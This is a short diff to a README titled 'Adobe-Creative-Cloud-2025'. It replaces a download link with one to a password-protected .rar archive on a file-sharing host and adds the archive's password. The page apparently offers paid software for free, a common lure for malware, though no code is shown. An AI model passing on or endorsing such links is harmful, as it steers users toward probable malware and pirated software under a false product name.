@@ -1,6 +1,7 @@
 # Adobe-Creative-Cloud-2025
-[Click Here to Download](https://rdmfile.eu/install/kczyrcMM0JIU)
+[Click Here to Download](https://www.mediafire.com/file/u8v2zkv3vj9i34b/Adobe_Creative_Cloud_Win64.rar/file)
 
+[Pass : S0f4fr33!]
 
 BUSINESS Creative Cloud
 
